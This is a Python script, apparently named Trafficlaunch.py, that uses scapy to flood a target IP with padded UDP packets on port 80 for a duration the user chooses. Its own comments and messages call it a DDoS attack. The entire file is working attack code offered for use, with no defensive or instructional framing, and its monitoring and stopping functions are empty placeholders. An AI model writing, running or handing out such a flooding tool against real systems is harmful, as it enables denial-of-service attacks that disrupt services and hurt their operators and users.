import os
import sys
import time
from scapy.all import sendp, Ether, IP, UDP
from multiprocessing import Process

# Define constants
DEFAULT_INTERFACE = "eth0"
DEFAULT_ATTACK_DURATION = 10  # in seconds
PACKET_SIZE = 1024  # Packet size in bytes
ATTACK_RATE = 100  # Packets per second

def launch_attack(target_ip, attack_duration=DEFAULT_ATTACK_DURATION, interface=DEFAULT_INTERFACE):
    """
    Function to simulate a DDoS attack by generating packets to the target IP.
    :param target_ip: IP address of the target machine.
    :param attack_duration: Duration of the attack in seconds.
    :param interface: Network interface to send the packets from.
    """
    try:
        print(f"Launching DDoS attack on {target_ip} for {attack_duration} seconds...")
        
        # Generate packets
        packet = Ether() / IP(dst=target_ip) / UDP(dport=80) / ("X" * (PACKET_SIZE - 42))  # Create a dummy packet

        end_time = time.time() + attack_duration
        while time.time() < end_time:
            sendp(packet, iface=interface, verbose=0)
            time.sleep(1.0 / ATTACK_RATE)  # Limit the attack rate

        print(f"Attack on {target_ip} completed.")

    except Exception as e:
        print(f"Error while launching attack: {e}")
        sys.exit(1)


def monitor_attack():
    """
    Function to monitor the status of the attack.
    Currently a placeholder function.
    """
    # This function could be expanded to include logging, monitoring of traffic patterns, etc.
    print("Monitoring attack traffic...")

def stop_attack():
    """
    Function to stop the DDoS attack.
    For now, we assume killing the process stops the attack.
    """
    print("Stopping the attack... (Currently, this process stops when the main function ends.)")


def main(target_ip):
    """
    Main function to launch the attack in a separate process for better control.
    :param target_ip: IP address of the target machine.
    """
    try:
        attack_duration = int(input("Enter attack duration (in seconds): "))
        p = Process(target=launch_attack, args=(target_ip, attack_duration))
        p.start()
        
        monitor_attack()  # Add monitoring functionality if needed
        
        p.join()  # Wait for the attack process to finish
        stop_attack()

    except KeyboardInterrupt:
        print("Attack interrupted.")
        stop_attack()
        sys.exit(0)

    except ValueError:
        print("Invalid input for attack duration. Please enter a valid integer.")
        sys.exit(1)

    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python Trafficlaunch.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    main(target_ip)
